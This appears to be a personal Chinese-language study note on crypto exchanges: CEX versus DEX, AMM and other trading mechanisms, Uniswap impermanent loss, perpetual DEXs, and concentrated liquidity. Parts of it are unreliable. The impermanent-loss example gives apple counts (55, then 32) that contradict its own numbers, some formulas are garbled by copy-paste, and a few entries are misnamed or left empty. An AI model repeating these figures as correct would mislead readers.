    <content><![CDATA[<h2 id="DEX-CEX"><a href="#DEX-CEX" class="headerlink" title="DEX &amp; CEX"></a>DEX &amp; CEX</h2><h3 id="CEX-vs-DEX-核心知识点总结"><a href="#CEX-vs-DEX-核心知识点总结" class="headerlink" title="CEX vs DEX 核心知识点总结"></a><strong>CEX vs DEX 核心知识点总结</strong></h3><h4 id="1-CEX（中心化交易所）"><a href="#1-CEX（中心化交易所）" class="headerlink" title="1. CEX（中心化交易所）"></a><strong>1. CEX（中心化交易所）</strong></h4><ul>
<li><strong>托管模式</strong>：用户资产由交易所控制，存在平台跑路风险。</li>
<li><strong>透明度低</strong>：交易记录不公开，依赖交易所的内部账本。</li>
<li><strong>流动性来源</strong>：主要依赖专业做市商提供深度。</li>
<li><strong>KYC要求</strong>：必须完成身份认证才能交易（合规要求）。</li>
<li><strong>典型代表</strong>：Binance、Coinbase、Kraken。</li>
</ul>
<h4 id="2-DEX（去中心化交易所）"><a href="#2-DEX（去中心化交易所）" class="headerlink" title="2. DEX（去中心化交易所）"></a><strong>2. DEX（去中心化交易所）</strong></h4><ul>
<li><strong>非托管模式</strong>：用户自持私钥，资产存于个人钱包（如MetaMask）。</li>
<li><strong>链上透明</strong>：所有交易记录公开可查（如Etherscan）。</li>
<li><strong>流动性来源</strong>：<ul>
<li>AMM 模式（如Uniswap）：依赖流动性池（LP提供）。</li>
<li>订单簿模式（如dYdX）：可能结合做市商。</li>
</ul>
</li>
<li><strong>无需许可</strong>：无需KYC，支持匿名交易。</li>
<li><strong>典型代表</strong>：Uniswap、SushiSwap、dYdX。</li>
</ul>
<h3 id="Token的作用？"><a href="#Token的作用？" class="headerlink" title="Token的作用？"></a>Token的作用？</h3><ul>
<li>作为数字资产在区块链上流通  </li>
<li>代表项目权益或使用权  </li>
<li>提供激励机制（如质押、治理）  </li>
<li>增强生态内流动性</li>
</ul>
<ol>
<li><strong>早期融资</strong>：帮助项目方（尤其是小团队）筹集启动资金（如通过IDO&#x2F;IEO）。</li>
<li><strong>社区治理</strong>：代币持有者可参与DAO投票，影响项目决策（如Uniswap的UNI）。</li>
<li><strong>生态功能</strong>：<ul>
<li>支付Gas费（如ETH、BNB）。</li>
<li>质押赚取收益（如DeFi挖矿）。</li>
</ul>
</li>
<li><strong>早期参与机会</strong>：允许散户在项目早期投资，分享成长红利。</li>
</ol>
<h4 id="why-we-need-Token"><a href="#why-we-need-Token" class="headerlink" title="why we need Token?"></a>why we need Token?</h4><ol>
<li><p><strong>早期投资机会</strong>：为个人投资者提供早期参与项目的途径。  </p>
</li>
<li><p><strong>项目筹资</strong>：帮助小型项目或内容创作者在初期阶段募集资金。  </p>
</li>
<li><p><strong>社区治理</strong>：通过代币持有者投票实现去中心化决策。  </p>
</li>
<li><p><strong>功能代表</strong>：代币可充当特定用途（如支付链上Gas费）。  </p>
<h4 id="如何使同质化代币（Fungible-Tokens）被广泛接受并易于交换？"><a href="#如何使同质化代币（Fungible-Tokens）被广泛接受并易于交换？" class="headerlink" title="如何使同质化代币（Fungible Tokens）被广泛接受并易于交换？"></a><strong>如何使同质化代币（Fungible Tokens）被广泛接受并易于交换？</strong></h4><ul>
<li><strong>中心化交易所（CEX）</strong>：如Binance、Coinbase，提供高流动性但需信任第三方。  </li>
<li><strong>去中心化交易所（DEX）</strong>：如Uniswap，通过AMM机制实现无需许可的交易。  </li>
<li><strong>场外交易（OTC）</strong>：大额直接交易，避免市场滑点。</li>
</ul>
</li>
</ol>
<h3 id="交易所的作用"><a href="#交易所的作用" class="headerlink" title="交易所的作用"></a>交易所的作用</h3><p>为代币提供更高的流动性，促进交易效率。</p>
<h3 id="四种交易机制"><a href="#四种交易机制" class="headerlink" title="四种交易机制"></a>四种交易机制</h3><h3 id="四种交易机制对比"><a href="#四种交易机制对比" class="headerlink" title="四种交易机制对比"></a>四种交易机制对比</h3><table>
<thead>
<tr>
<th>机制类型</th>
<th>核心原理</th>
<th>代表项目</th>
<th>优缺点分析</th>
</tr>
</thead>
<tbody><tr>
<td><strong>CLOB</strong></td>
<td>- 中央限价订单簿模式<br>- 买卖双方挂限价单<br>- 交易所进行订单匹配</td>
<td>Binance, Coinbase</td>
<td>✅ 价格发现高效<br>❌ 需要足够流动性<br>❌ 中心化风险</td>
</tr>
<tr>
<td><strong>AMM</strong></td>
<td>- 算法自动做市（如x*y&#x3D;k）<br>- 流动性池定价<br>- 用户与合约交互</td>
<td>Uniswap, PancakeSwap</td>
<td>✅ 无需订单簿<br>✅ 7x24自动运行<br>❌ 大额交易滑点高</td>
</tr>
<tr>
<td><strong>RFQ</strong></td>
<td>- 询价交易模式<br>- 交易者请求报价<br>- 做市商提供报价</td>
<td>0x协议, 1inch</td>
<td>✅ 适合大额交易<br>✅ 价格优化<br>❌ 依赖做市商网络</td>
</tr>
<tr>
<td><strong>Oracle-based</strong></td>
<td>- 依赖预言机喂价<br>- 链外价格输入链内<br>- 用于衍生品&#x2F;借贷清算</td>
<td>GMX, Synthetix</td>
<td>✅ 价格准确<br>❌ 预言机风险<br>❌ 中心化依赖</td>
</tr>
</tbody></table>
<h4 id="关键区别"><a href="#关键区别" class="headerlink" title="关键区别"></a>关键区别</h4><ol>
<li><p><strong>定价方式</strong>  </p>
<ul>
<li>CLOB&#x2F;AMM：内生价格（订单簿&#x2F;公式计算）  </li>
<li>RFQ&#x2F;Oracle：外生价格（做市商&#x2F;预言机）</li>
</ul>
</li>
<li><p><strong>Uniswap定位</strong>  </p>
<ul>
<li>纯AMM机制，核心依赖流动性池  </li>
<li>仅辅助使用预言机（如TWAP价格预言机）</li>
</ul>
</li>
<li><p><strong>适用场景</strong>  </p>
<ul>
<li>现货交易：AMM &gt; CLOB  </li>
<li>大额交易：RFQ &gt; AMM  </li>
<li>衍生品交易：Oracle &gt; AMM</li>
</ul>
</li>
</ol>
<h3 id="Fungible-Token-Market-Place（同质化代币市场）的分类和示例"><a href="#Fungible-Token-Market-Place（同质化代币市场）的分类和示例" class="headerlink" title="Fungible Token Market Place（同质化代币市场）的分类和示例"></a><strong>Fungible Token Market Place（同质化代币市场）</strong>的分类和示例</h3><ol>
<li><p><strong>CEX（中心化交易所）</strong></p>
<ul>
<li>由中心化机构运营，用户托管资产，依赖订单簿匹配交易。</li>
<li><strong>常见示例</strong>：Binance、Coinbase、Kraken（图中未列出具体名称）。</li>
</ul>
</li>
<li><p><strong>DEX（去中心化交易所）</strong></p>
<ul>
<li>通过智能合约实现链上交易，用户自托管资产，分为多种技术类型：<ul>
<li><strong>AMM DEX（自动化做市商）</strong><ul>
<li>通过流动性池和算法定价（如 x⋅y&#x3D;k<em>x</em>⋅<em>y</em>&#x3D;<em>k</em>）。</li>
<li><strong>示例</strong>：Uniswap v1&#x2F;v2&#x2F;v3、Curve（专注稳定币）、Balancer（自定义资金池）。</li>
</ul>
</li>
<li><strong>Orderbook DEX（订单簿模式）</strong><ul>
<li>类似传统交易所的买卖挂单模式，但链上执行（如Serum）。</li>
</ul>
</li>
<li><strong>其他创新类型</strong>：<ul>
<li><strong>GLOB（全局订单簿）</strong>: dYdX（衍生品交易）。</li>
<li><strong>vAMM（虚拟AMM）</strong>: Perpetual Protocol（永续合约，无需真实流动性）。</li>
<li><strong>Oracle-based（预言机驱动）</strong>: GAIX（依赖外部预言机报价）。</li>
<li><strong>RFO（请求报价）</strong>: Hashflow、Paradigm（做市商按需报价）。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>OTC（场外交易）</strong></p>
<ul>
<li>点对点大宗交易，通常通过协商定价，避免滑点。</li>
<li><strong>常见场景</strong>：机构间直接交易或通过OTC平台（如Circle Trade、Genesis）。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>分类</strong></th>
<th><strong>特点</strong></th>
<th><strong>优缺点</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>CEX</strong></td>
<td>中心化运营，订单簿匹配，用户资产托管。</td>
<td>✅ 效率高、流动性好；❌ 需信任机构，存在监管风险。</td>
</tr>
<tr>
<td><strong>DEX</strong></td>
<td>去中心化，智能合约交易，用户自托管资产。</td>
<td>✅ 去信任化、抗审查；❌ 技术限制（滑点、延迟、高Gas费）。</td>
</tr>
<tr>
<td><strong>OTC</strong></td>
<td>点对点协商定价，场外大宗交易。需通过可信中介或平台完成交易</td>
<td>✅ 无滑点、适合大额；❌ 流动性依赖对手方，透明度低。</td>
</tr>
</tbody></table>
</li>
</ol>
<hr>
<h3 id="DEX交易所特点（对比CEX）"><a href="#DEX交易所特点（对比CEX）" class="headerlink" title="DEX交易所特点（对比CEX）"></a>DEX交易所特点（对比CEX）</h3><ol>
<li><p><strong>Non-custodial</strong>（非托管）</p>
<ul>
<li>用户自主掌控资产，无需依赖第三方托管。</li>
</ul>
</li>
<li><p>**Open (global access)**（开放，全球可访问）</p>
<ul>
<li>无许可限制，任何人可参与，不受地域或身份约束。</li>
</ul>
</li>
<li><p><strong>Transparent</strong>（透明）</p>
<ul>
<li>所有交易和规则通过区块链公开可查，代码开源。 </li>
<li>从这条也可以得出dex的效率更高：</li>
</ul>
<ol>
<li>可以在其他链上互搭，做延展工作</li>
<li>社区治理更便利</li>
</ol>
</li>
<li><p><strong>Composable</strong>（可组合性）</p>
<ul>
<li>协议间可相互调用和集成（如“货币乐高”），提升创新效率。</li>
</ul>
</li>
<li><p><strong>Decentralized</strong>（去中心化）</p>
<ul>
<li>无单一控制节点，由分布式网络或社区治理。</li>
</ul>
</li>
</ol>
<h4 id="区别（DEX-vs-CEX）"><a href="#区别（DEX-vs-CEX）" class="headerlink" title="区别（DEX vs. CEX）"></a>区别（DEX vs. CEX）</h4><table>
<thead>
<tr>
<th><strong>对比维度</strong></th>
<th><strong>CEX（中心化交易所）</strong></th>
<th><strong>DEX（去中心化交易所）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>托管方式</strong></td>
<td>✅ 托管（用户资产由平台控制）</td>
<td>❌ 非托管（用户自持私钥）</td>
</tr>
<tr>
<td><strong>流动性提供方</strong></td>
<td>做市商（market maker）</td>
<td>散户（通过流动性池参与）(Retail)</td>
</tr>
<tr>
<td><strong>准入权限</strong></td>
<td>需KYC（身份验证）</td>
<td>无许可（匿名访问）</td>
</tr>
<tr>
<td><strong>透明度</strong></td>
<td>不透明（黑箱操作，数据不公开）</td>
<td>透明（链上数据可查）</td>
</tr>
<tr>
<td><strong>可组合性</strong></td>
<td>❌ 无法与其他协议交互</td>
<td>✅ 可组合（如“DeFi乐高”）</td>
</tr>
<tr>
<td><strong>信用风险</strong></td>
<td>存在（依赖平台信誉）</td>
<td>无（依赖智能合约代码）</td>
</tr>
<tr>
<td><strong>信任基础</strong></td>
<td>机构或个人（需信任第三方）</td>
<td>代码（去中心化执行）</td>
</tr>
</tbody></table>
<hr>
<h3 id="第一个DEX：Uniswap"><a href="#第一个DEX：Uniswap" class="headerlink" title="第一个DEX：Uniswap"></a>第一个DEX：Uniswap</h3><ul>
<li><strong>AMM机制（Automated Market Maker）</strong>：通过流动性池自动定价，取代传统订单簿（CLOB）  </li>
<li><strong>无偿损失（Impermanent Loss）</strong>：流动性提供者因价格波动产生的潜在损失，Uniswap通过交易费补贴  </li>
<li><strong>滑点问题</strong>：大额交易可能导致执行价格偏离预期</li>
</ul>
<p>【1】</p>
<hr>
<p>举例：</p>
<p>动化做市商 (x*y &#x3D; C)<br>案例研究：什么是无常损失？<br>代币对：苹果&#x2F;橙子<br>当 T &#x3D; T0 时，苹果-橙子余额为 x0&#x3D;50，y0&#x3D;50，价格比例为 1:1<br>当 T &#x3D; T1 时，1 苹果 &#x3D; 10 橙子</p>
<p>问题：现在的苹果-橙子余额 x1, y1 是多少？</p>
<p>解决方案：<br>C &#x3D; 50x50 &#x3D; 2500<br>新余额 x1xy1 &#x3D; C &#x3D; 2500，且 y1&#x3D;10*x1<br>因此，x1 ≈ 16，y1 ≈ 160<br>当价格为 1:1 时，流动性提供者(LP)有 55 苹果，现在在 T1 时，流动性提供者只有 32 苹果</p>
<p>Who take away这些无偿损失:</p>
<p>在自动化做市商（AMM）模型中，<strong>无常损失（Impermanent Loss）并不是被某个特定的人或实体“拿走”的</strong>，而是流动性提供者（LP）因市场价格波动而产生的<strong>机会成本</strong>。具体来说：</p>
<ol>
<li><strong>无常损失的本质</strong>：<ul>
<li>当代币价格比率发生变化时，AMM 会自动调整资金池中的代币数量（遵循 x⋅y&#x3D;C<em>x</em>⋅<em>y</em>&#x3D;<em>C</em> 的公式），导致LP持有的代币组合价值低于单纯持有原始数量时的价值。</li>
<li>这种“损失”是相对于“未提供流动性，而是单纯持有代币”的情况而言的。</li>
</ul>
</li>
<li><strong>谁“受益”了？</strong><ul>
<li><strong>套利者（Arbitrageurs）</strong>：当市场价格变化时，套利者会通过AMM池的低买高卖获利，导致池内代币比例调整，而LP的代币数量随之变化。</li>
<li><strong>其他市场参与者</strong>：LP实际上是为交易者提供流动性服务，无常损失可以视为LP为赚取交易手续费而承担的风险成本。</li>
</ul>
</li>
<li><strong>为什么叫“无常”？</strong><ul>
<li>如果价格比率恢复到初始状态（如案例中从1:10回到1:1），这种损失会消失。但若价格未回归，损失则成为永久性的。</li>
</ul>
</li>
<li><strong>关键点</strong>：<ul>
<li>无常损失并非被恶意窃取，而是AMM机制和市场价格波动共同作用的结果。</li>
<li>LP通过交易手续费补偿这部分损失，但若手续费收入不足以覆盖无常损失，则可能净亏损。</li>
</ul>
</li>
</ol>
<p><strong>简单总结</strong>：无常损失是LP因提供流动性而承担的市场风险，其“受益者”是套利者和交易者，但这是去中心化交易所正常运行的必要机制。</p>
<p>无偿损失——uniswap用交易费补贴</p>
<hr>
<h4 id="Uniswap核心特点"><a href="#Uniswap核心特点" class="headerlink" title="Uniswap核心特点"></a>Uniswap核心特点</h4><ul>
<li>交易量越高，流动性提供者收益越大  （交易量越高，越赚）</li>
<li><strong>Concentrated Liquidity（集中流动性）</strong>：Uniswap v3允许流动性集中在特定价格区间，提升资本效率</li>
</ul>
<h4 id="优点（Pros）"><a href="#优点（Pros）" class="headerlink" title="优点（Pros）"></a><strong>优点（Pros）</strong></h4><ol>
<li><strong>数学设计优雅</strong>：基于简单的数学公式（如 x⋅y&#x3D;C<em>x</em>⋅<em>y</em>&#x3D;<em>C</em>），机制透明且可预测。</li>
<li><strong>无需信任的交易</strong>：用户无需依赖中介，可直接通过智能合约交易。</li>
<li><strong>散户可参与流动性提供</strong>：降低了做市门槛，普通用户也能成为流动性提供者（LP）。</li>
<li><strong>无需许可上架长尾资产</strong>：任何项目方均可自由上线代币，无需传统审核流程。</li>
</ol>
<h4 id="缺点（Cons）"><a href="#缺点（Cons）" class="headerlink" title="缺点（Cons）"></a><strong>缺点（Cons）</strong></h4><ol>
<li><strong>滑点高</strong>：大额交易会因流动性不足导致价格大幅偏离预期。</li>
<li><strong>无常损失严重</strong>：价格波动时，LP可能面临显著的资产价值损失。</li>
<li><strong>MEV抢跑</strong>：矿工或机器人通过提前交易（Front Running）获利，损害普通用户利益。</li>
</ol>
<hr>
<h3 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h3><ul>
<li><strong>MEV（Maximal Extractable Value）</strong>：矿工或验证者通过交易排序获取的额外收益  </li>
<li><strong>DeFi衍生品</strong>：如期货、期权等，dYdX协议是典型代表（但仍存在滑点问题）  </li>
<li><strong>Basket</strong>：一篮子资产组合，可能包含波动性不同的代币  </li>
<li><strong>稳定币</strong>：价格锚定法币（如USDT、DAI）的加密货币，用于降低波动风险  </li>
<li><strong>Depaid</strong>:</li>
<li><strong>量化</strong>：</li>
</ul>
<hr>
<h2 id="一些DEX的衍生品"><a href="#一些DEX的衍生品" class="headerlink" title="一些DEX的衍生品"></a>一些DEX的衍生品</h2><h4 id="DeFi永续合约现状"><a href="#DeFi永续合约现状" class="headerlink" title="DeFi永续合约现状"></a>DeFi永续合约现状</h4><h5 id="市场潜力分析"><a href="#市场潜力分析" class="headerlink" title="市场潜力分析"></a>市场潜力分析</h5><ul>
<li><strong>CeFi永续合约规模</strong>：2021年交易量达$57万亿  </li>
<li><strong>DeFi永续合约现状</strong>：仅占3%（$1.7万亿），远低于现货交易占比（10%）  </li>
<li><strong>增长空间</strong>：若达到现货比例，DeFi永续合约有7%的潜在增长空间（约$4万亿）</li>
</ul>
<h5 id="核心挑战"><a href="#核心挑战" class="headerlink" title="核心挑战"></a>核心挑战</h5><ol>
<li><strong>流动性要求</strong>：需深度流动性支持  </li>
<li><strong>价格准确性</strong>：长尾资产易被操纵  </li>
<li><strong>技术需求</strong>：快速最终性与结算效率</li>
</ol>
<hr>
<h4 id="dYdX协议（CLOB模式）"><a href="#dYdX协议（CLOB模式）" class="headerlink" title="dYdX协议（CLOB模式）"></a>dYdX协议（CLOB模式）</h4><p><strong>定位</strong>：去中心化衍生品交易所标杆  </p>
<p><strong>技术架构</strong></p>
<ul>
<li><strong>底层技术</strong>：基于StarkWare扩容方案  </li>
<li><strong>混合架构</strong>：<br>✅ 链下订单匹配<br>✅ 链上结算</li>
</ul>
<p><strong>核心优势</strong></p>
<ul>
<li><strong>流动性来源</strong>：机构做市商参与  </li>
<li><strong>资产安全</strong>：用户钱包自托管  </li>
<li><strong>体验优化</strong>：提供CEX级交易体验</li>
</ul>
<p>但还存在“uniswap滑点”问题</p>
<h4 id="GMX-Oracle-based-Orderbook（基于预言机的订单簿）"><a href="#GMX-Oracle-based-Orderbook（基于预言机的订单簿）" class="headerlink" title="** GMX - Oracle-based Orderbook（基于预言机的订单簿）**"></a>** GMX - Oracle-based Orderbook（基于预言机的订单簿）**</h4><ul>
<li><strong>底层链</strong>：基于 Arbitrum（以太坊 Layer 2 扩容方案）。</li>
<li><strong>订单匹配与结算</strong>：<ul>
<li><strong>链上订单匹配</strong>：通过智能合约完成订单撮合。</li>
<li><strong>链上结算</strong>：所有交易最终在链上结算，保证透明性。</li>
</ul>
</li>
<li><strong>核心机制</strong>：<ul>
<li><strong>Oracle-based（基于预言机）</strong>：价格依赖外部预言机（如 Chainlink）提供实时市场数据，而非依赖链上流动性池。</li>
<li><strong>Basket of tokens（一篮子代币流动性）</strong>：<ul>
<li><strong>含义</strong>：GMX 的流动性池由一篮子主流资产（如 ETH、BTC、稳定币）组成，用户交易时共享这些资产的综合流动性。</li>
<li><strong>波动风险</strong>：篮子中代币的价格波动会影响整体流动性价值，例如 ETH 暴跌可能导致池内资产缩水。</li>
</ul>
</li>
</ul>
</li>
<li><strong>用户控制权</strong>：用户始终掌握钱包资产所有权（非托管）。</li>
</ul>
<hr>
<h4 id="Perp-vAMM-Order-Book（虚拟自动化做市商订单簿）"><a href="#Perp-vAMM-Order-Book（虚拟自动化做市商订单簿）" class="headerlink" title="Perp - vAMM Order Book（虚拟自动化做市商订单簿）"></a><strong>Perp - vAMM Order Book（虚拟自动化做市商订单簿）</strong></h4><ul>
<li><p><strong>底层链</strong>：基于 Optimism（以太坊 Layer 2 扩容方案）。</p>
</li>
<li><p><strong>订单匹配与结算</strong>：</p>
<ul>
<li><strong>链上订单匹配与结算</strong>：与 GMX 类似，完全在链上执行。</li>
</ul>
</li>
<li><p><strong>核心机制</strong>：</p>
<ul>
<li><strong>vAMM（虚拟自动化做市商）</strong>：<ul>
<li>采用类似 Uniswap v3 的集中流动性模型，但资金池是“虚拟的”（无需实际存入代币）。</li>
<li>交易价格由 vAMM 的数学公式计算，流动性提供者（LPs）通过提供资金赚取费用。</li>
</ul>
</li>
<li><strong>Uniswap v3 流动性</strong>：可能与 Uniswap v3 的流动性池联动，增强深度。</li>
</ul>
</li>
<li><p><strong>用户控制权</strong>：同样是非托管模式，用户自有钱包资产。</p>
<h5 id="核心概念解释"><a href="#核心概念解释" class="headerlink" title="核心概念解释"></a><strong>核心概念解释</strong></h5><ul>
<li><strong>Basket（一篮子代币）</strong>：<br>GMX 将多种资产聚合为一个共享流动性池，优点是提高资金利用率，但代币价格波动会直接影响池内资产总值。</li>
<li><strong>vAMM（虚拟 AMM）</strong>：<br>Perp 通过虚拟池模拟传统 AMM 的流动性，实际结算时依赖抵押资产，减少无常损失风险。</li>
</ul>
<hr>
<p><strong>适用场景</strong></p>
<ul>
<li><strong>GMX</strong>：适合希望交易主流资产、依赖预言机公正价格的用户，但需承担篮子资产波动风险。</li>
<li><strong>Perp</strong>：适合偏好 Uniswap v3 式流动性模型、追求更低滑点的衍生品交易者。</li>
</ul>
</li>
</ul>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>“集中流动性（Concentrated Liquidity）”</strong> 在 <strong>Curve 和 Uniswap v3</strong> 中的实现方式与传统 AMM（如 Uniswap v2）的关键区别：</p>
<h3 id="传统-AMM（如-Uniswap-v2）的流动性分布"><a href="#传统-AMM（如-Uniswap-v2）的流动性分布" class="headerlink" title="传统 AMM（如 Uniswap v2）的流动性分布"></a><strong>传统 AMM（如 Uniswap v2）的流动性分布</strong></h3><ul>
<li>流动性均匀分布在 <strong>整个价格范围（0 → ∞）</strong>，即无论价格如何变动，LP 提供的资金都会被动用于所有可能的交易对价格。</li>
<li>这导致 <strong>资本效率低下</strong>，因为大部分流动性很少被用到（例如稳定币交易对通常只在 1:1 附近波动）。</li>
</ul>
<h4 id="集中流动性（Concentrated-Liquidity）的改进"><a href="#集中流动性（Concentrated-Liquidity）的改进" class="headerlink" title="集中流动性（Concentrated Liquidity）的改进"></a><strong>集中流动性（Concentrated Liquidity）的改进</strong></h4><p><strong>（Uniswap v3 和 Curve 的不同实现）</strong></p>
<ol>
<li><strong>Uniswap v3 的方式</strong>：<ul>
<li>LP 可以 <strong>自定义流动性提供的价格区间</strong>（例如 ETH&#x2F;USDC 只在 1800−1800−2200 之间提供流动性）。</li>
<li>优点：<strong>资本效率大幅提高</strong>，同样的资金在特定区间能提供更深度的流动性，减少滑点。</li>
<li>缺点：LP 需要主动管理价格区间，若价格超出范围则停止赚取手续费，并可能面临更高的无常损失。</li>
</ul>
</li>
<li><strong>Curve 的方式（如 Curve v2）</strong>：<ul>
<li>针对 <strong>稳定币或锚定资产</strong> 优化，流动性自动 <strong>集中在市场最可能交易的窄幅价格区间</strong>（如 0.99-1.01）。</li>
<li>采用 <strong>动态调整算法</strong>，当价格偏离时，流动性池会自动重新平衡，减少无常损失。</li>
<li>优点：在稳定币交易对中滑点极低，适合高频交易。</li>
</ul>
</li>
</ol>
<h4 id="核心区别总结"><a href="#核心区别总结" class="headerlink" title="核心区别总结"></a><strong>核心区别总结</strong></h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Uniswap v3</th>
<th align="left">Curve (v2)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>目标资产</strong></td>
<td align="left">波动性资产（如 ETH）</td>
<td align="left">稳定币&#x2F;锚定资产</td>
</tr>
<tr>
<td align="left"><strong>流动性分布</strong></td>
<td align="left">自定义区间（手动）</td>
<td align="left">动态窄幅区间（自动）</td>
</tr>
<tr>
<td align="left"><strong>资本效率</strong></td>
<td align="left">高（需主动管理）</td>
<td align="left">极高（自动优化）</td>
</tr>
<tr>
<td align="left"><strong>无常损失</strong></td>
<td align="left">较高（价格超出区间）</td>
<td align="left">较低（动态再平衡）</td>
</tr>
</tbody></table>
<p><strong>简单来说</strong>：</p>
<ul>
<li><strong>Uniswap v3</strong> 让 LP 自己选择流动性集中的价格段，适合波动大的资产。</li>
<li><strong>Curve</strong> 自动把流动性集中在最可能交易的窄范围，特别适合稳定币。</li>
<li>两者都比传统 AMM（全范围流动性）更高效，但管理方式和适用场景不同。</li>
</ul>
<p>关于 <strong>集中流动性做市（Concentrated Liquidity Market Making, CLMM）</strong> 的核心优势和应用场景</p>
<hr>
<h3 id="为什么需要集中流动性做市（CLMM）？"><a href="#为什么需要集中流动性做市（CLMM）？" class="headerlink" title="为什么需要集中流动性做市（CLMM）？"></a><strong>为什么需要集中流动性做市（CLMM）？</strong></h3><ol>
<li><p><strong>降低无常损失（Reduce Impermanent Loss）</strong>  </p>
<ul>
<li>传统AMM（如Uniswap v2）的流动性分布在全价格范围（0→∞），导致价格波动时LP损失较大。  </li>
<li>CLMM允许流动性集中在<strong>高频交易区间</strong>，减少因价格偏离带来的无常损失。</li>
</ul>
</li>
<li><p><strong>降低交易滑点（Reduce Trading Slippage）</strong>  </p>
<ul>
<li>流动性集中在特定价格区间（如Uniswap v3的自定义范围或Curve的稳定币窄幅区间），使得<strong>相同资本能提供更深度的流动性</strong>，大幅降低大额交易的滑点。</li>
</ul>
</li>
<li><p><strong>稳定币兑换的优化（Why Stablecoin Swap?）</strong>  </p>
<ul>
<li>稳定币交易对（如USDC&#x2F;USDT）通常围绕<strong>1:1价格波动</strong>，CLMM可针对性提供超低滑点兑换，催生了<strong>“Curve Wars”</strong>（协议争抢Curve流动性以提高自身代币收益）。</li>
</ul>
</li>
<li><p><strong>UST脱钩事件的影响（What Happened After UST Depeg?）</strong>  </p>
<ul>
<li>2022年UST崩盘导致Curve的UST&#x2F;3Pool流动性池严重失衡，引发连锁清算，暴露了CLMM在极端行情下的风险。  </li>
<li>此后，<strong>Curve和AAVE等协议纷纷推出新的稳定币解决方案</strong>（如Curve v2的动态费率调整、AAVE的GHO稳定币），以增强系统稳定性。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="Curve-vs-Uniswap-v3-的CLMM设计差异"><a href="#Curve-vs-Uniswap-v3-的CLMM设计差异" class="headerlink" title="Curve vs. Uniswap v3 的CLMM设计差异"></a><strong>Curve vs. Uniswap v3 的CLMM设计差异</strong></h4><table>
<thead>
<tr>
<th><strong>目标</strong></th>
<th><strong>Uniswap v3</strong></th>
<th><strong>Curve</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>适用资产</strong></td>
<td>波动性资产（ETH&#x2F;BTC等）</td>
<td>稳定币&#x2F;锚定资产（USDC&#x2F;USDT）</td>
</tr>
<tr>
<td><strong>流动性分配</strong></td>
<td>LP手动设置价格区间</td>
<td>自动集中在1:1附近窄幅区间</td>
</tr>
<tr>
<td><strong>无常损失</strong></td>
<td>较高（若价格超出区间）</td>
<td>极低（动态再平衡）</td>
</tr>
<tr>
<td><strong>典型案例</strong></td>
<td>ETH&#x2F;USDC交易对</td>
<td>Curve 3Pool（DAI&#x2F;USDC&#x2F;USDT）</td>
</tr>
</tbody></table>
<hr>
<h4 id="核心结论"><a href="#核心结论" class="headerlink" title="核心结论"></a><strong>核心结论</strong></h4><ul>
<li><strong>CLMM通过集中流动性提升资本效率</strong>，但需权衡管理复杂度（如Uniswap v3）或依赖算法稳定性（如Curve）。  </li>
<li><strong>稳定币赛道是CLMM的主战场</strong>（Curve Wars），但极端风险（如UST脱钩）仍需风控机制。  </li>
<li>未来CLMM可能进一步分化：Uniswap v3适合波动资产，Curve主导稳定币，而AAVE等协议尝试创新解决方案。</li>
</ul>
<p>（注：图中提到的“Curve, AAVE both announced stablecoin solution”指两大协议在UST事件后推出的稳定币相关优化，如Curve v2的紧急费率调整、AAVE的GHO稳定币等。）</p>
<h3 id="一、为什么提供流动性（LP）？"><a href="#一、为什么提供流动性（LP）？" class="headerlink" title="一、为什么提供流动性（LP）？"></a><strong>一、为什么提供流动性（LP）？</strong></h3><p><strong>1. 收益（Rewards）</strong></p>
<ul>
<li><strong>交易手续费分成</strong>：LP通过用户交易赚取手续费（如Uniswap通常为0.3%）。</li>
<li><strong>额外激励</strong>：部分协议（如Curve、Sushi）提供代币奖励（流动性挖矿）。</li>
<li><strong>资本效率提升</strong>：集中流动性（如Uniswap v3）可提高资金利用率，获得更高收益。</li>
</ul>
<p><strong>2. 风险（Risks）</strong></p>
<ul>
<li><strong>无常损失（Impermanent Loss）</strong>：价格波动导致LP资产价值低于单纯持有时的损失。</li>
<li><strong>智能合约风险</strong>：漏洞或黑客攻击可能导致资金损失（如2021年Poly Network事件）。</li>
<li><strong>流动性范围失效</strong>（CLMM中）：若价格超出集中区间（Uniswap v3），LP停止赚取手续费。</li>
<li><strong>代币贬值风险</strong>：若提供流动性的代币本身价格暴跌（如UST脱钩），损失加剧。</li>
</ul>
<p><strong>3. 适用场景</strong></p>
<ul>
<li>适合长期看好某代币对的投资者，或通过高频复利（如稳定币池）对冲无常损失。</li>
</ul>
<hr>
<h3 id="二、为什么选择Uniswap（DEX）而非CEX？"><a href="#二、为什么选择Uniswap（DEX）而非CEX？" class="headerlink" title="二、为什么选择Uniswap（DEX）而非CEX？"></a><strong>二、为什么选择Uniswap（DEX）而非CEX？</strong></h3><p><strong>1. 去中心化优势（DEX Pros）</strong></p>
<ul>
<li><strong>无需信任（Trustless）</strong>：用户自托管资产，无需依赖中心化机构（避免FTX式暴雷）。</li>
<li><strong>无需KYC</strong>：匿名交易，保护隐私。</li>
<li><strong>抗审查</strong>：上架资产无需许可，支持长尾代币（如MEME币、新项目）。</li>
<li><strong>创新交易模式</strong>：如CLMM、闪电贷等，CEX难以实现。</li>
</ul>
<p><strong>2. 中心化交易所劣势（CEX Cons）</strong></p>
<ul>
<li><strong>资金风险</strong>：用户资产由交易所控制，存在挪用或跑路风险。</li>
<li><strong>交易限制</strong>：提现冻结、地域合规限制（如Binance退出部分国家）。</li>
<li><strong>高滑点</strong>：部分小币种流动性不足，大额交易成本高。</li>
</ul>
<p><strong>3. 例外情况（CEX更优的场景）</strong></p>
<ul>
<li><strong>法币出入金</strong>：CEX支持直接法币兑换（如Coinbase）。</li>
<li><strong>高频&#x2F;衍生品交易</strong>：CEX提供更低延迟和丰富工具（如期货、杠杆）。</li>
</ul>
